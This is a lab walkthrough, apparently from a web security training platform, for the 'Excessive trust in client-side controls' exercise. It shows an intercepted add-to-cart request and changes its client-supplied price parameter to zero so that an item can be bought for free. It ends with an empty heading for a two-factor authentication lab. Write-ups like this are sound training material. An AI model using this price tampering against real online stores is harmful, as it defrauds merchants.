# Lab: Excessive trust in client-side controls

First, open Burp Suite and access the lab. Log in using the provided credentials wiener:peter.

After logging in, navigate to the home page. You will see a product priced at $1337, while your account balance is only $100, so you cannot purchase it normally.

Turn on Burp Intercept and click “Add to cart” on the product page. The request will be captured in Burp. You should see the following request:

```
POST /cart HTTP/2
Host: 0a0b00ff04458ad281b0993600f000b5.web-security-academy.net
Cookie: session=YR8shXWi04rq8I4BkmrmWWPZVsIDltBx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://0a0b00ff04458ad281b0993600f000b5.web-security-academy.net
Referer: https://0a0b00ff04458ad281b0993600f000b5.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1&price=133700
```

Notice that the price parameter is being sent from the client side. This is the key flaw.

Modify the request by changing:
price=133700 → price=0

Forward the modified request.

Now go back to the cart page. You will see that the product price has been updated to 0, confirming that the server trusted client-side input without proper validation.

Proceed to checkout and complete the purchase to solve the lab.


# Lab: 2FA broken logic
